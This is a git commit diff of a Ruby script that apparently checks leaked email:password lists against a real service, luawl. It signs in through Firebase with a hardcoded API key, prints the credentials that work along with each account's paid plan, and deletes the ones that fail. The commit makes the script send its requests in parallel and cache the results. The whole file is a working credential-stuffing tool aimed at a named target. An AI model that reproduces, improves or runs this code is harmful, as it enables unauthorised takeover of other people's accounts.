2d90277287055acbea5d64472080616e7b49cc76
pwd0kernel <79817991+pwd0kernel@users.noreply.github.com>
2022-12-19 21:41:54 -0330

    Update main.rb

--- main.rb
+++ main.rb
@@ -1,59 +1,87 @@
-require 'net/http'
-require 'uri'
+require 'concurrent'
+require 'http'
 require 'json'
 
 API_KEY = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"
 
+# Cache to store the results of HTTP requests
+@cache = {}
+
 def get_token(uemail, upass, key)
+  # Check the cache first
+  cache_key = uemail + '-' + upass
+  if @cache.key?(cache_key)
+    return @cache[cache_key]
+  end
+
+  # Make an HTTP request
   uri = URI("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
-  request = Net::HTTP::Post.new(uri)
-  request.content_type = "application/json"
-  request.body = {
+  response = HTTP.post(uri, json: {
     returnSecureToken: true,
     email: uemail,
     password: upass,
-  }.to_json
-
-  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
-    http.request(request)
-  end
+  })
 
   json = JSON.parse(response.body)
-  json["idToken"]
+  token = json["idToken"]
+
+  # Update the cache
+  @cache[cache_key] = token
+
+  token
 end
 
 def get_plan(token)
-  uri = URI("https://api2.luawl.com/validateLoginFB.php")
-  request = Net::HTTP::Post.new(uri)
-  request["Authorization"] = "Bearer " + token
-  request["Origin"] = "https://dashboard.luawl.com"
-  request["Sec-Fetch-Site"] = "same-site"
-  request["Sec-Fetch-Mode"] = "cors"
-  request["Sec-Fetch-Dest"] = "empty"
-  request["Host"] = "api2.luawl.com"
-  request["Content-Type"] = "application/json"
-  request["Referer"] = "https://dashboard.luawl.com/"
-
-  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
-    http.request(request)
+  # Check the cache first
+  if @cache.key?(token)
+    return @cache[token]
   end
 
+  # Make an HTTP request
+  uri = URI("https://api2.luawl.com/validateLoginFB.php")
+  response = HTTP.post(uri, headers: {
+    "Authorization" => "Bearer " + token,
+    "Origin" => "https://dashboard.luawl.com",
+    "Sec-Fetch-Site" => "same-site",
+    "Sec-Fetch-Mode" => "cors",
+    "Sec-Fetch-Dest" => "empty",
+    "Host" => "api2.luawl.com",
+    "Content-Type" => "application/json",
+    "Referer" => "https://dashboard.luawl.com/",
+  })
+
   json = JSON.parse(response.body)
-  json["data"][0]["plan_name"]
+  plan = json["data"][0]["plan_name"]
+
+  # Update the cache
+  @cache[token] = plan
+
+  plan
 end
 
 def get_tokens_from_file(file, key)
-  File.open(file).each do |line|
-    email, pass = line.split(":")
-    token = get_token(email, pass, key)
-    if token.nil?
-      lines = File.readlines(file).reject { |l| l.include?(line) }
-      File.write(file, lines.join)
-    else
-      plan = get_plan(token)
-      puts "\e[32m" + line + "\e[0m" + " - " + plan
+  # Read the entire file into memory
+  lines = File.readlines(file)
+
+  # Make HTTP requests in parallel
+  results = Concurrent::Promise.zip(*lines.map do |line|
+    Concurrent::Promise.execute do
+      email, pass = line.split(":")
+      token = get_token(email, pass, key)
+      if token.nil?
+        lines.reject! { |l| l.include?(line) }
+      else
+        plan = get_plan(token)
+        "\e[32m" + line + "\e[0m" + " - " + plan
+      end
     end
-  end
+  end).value
+
+  # Write the updated lines to the file
+  File.write(file, lines.join)
+
+  # Print the results
+  puts results.compact
 end
 
 get_tokens_from_file("pass.txt", API_KEY)
